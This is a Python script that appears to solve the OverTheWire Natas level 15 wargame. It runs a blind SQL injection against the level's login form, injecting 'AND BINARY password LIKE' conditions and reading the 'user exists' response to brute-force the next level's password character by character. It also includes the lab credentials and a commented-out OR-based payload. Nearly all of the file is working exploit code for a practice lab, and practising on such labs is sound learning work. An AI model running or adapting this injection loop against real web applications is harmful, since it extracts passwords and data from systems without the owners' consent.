#!/usr/bin/env python3

import requests
import re
import string
req = requests.Session()

s= string.ascii_letters+string.digits

username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
url = "http://%s.natas.labs.overthewire.org/" % username

# data = {"username":'" OR username LIKE "%"#'}
# req_post = req.post(url,auth=(username,password),data=data)
# print(req_post.text)

passwordd=""

while len(passwordd)!=32:
	for i in s:
		payload = passwordd+i
		data = {"username":'natas16" AND BINARY password LIKE "'+payload+'%"#'}
		req_post = req.post(url,auth=(username,password),data=data)
		print("Trying...",payload)
		if ("This user exists." in req_post.text):
			passwordd+=i
			break
print(passwordd)

#natas16: WaIHEacj63wnNIBROHeqi3p9t0m5nhmh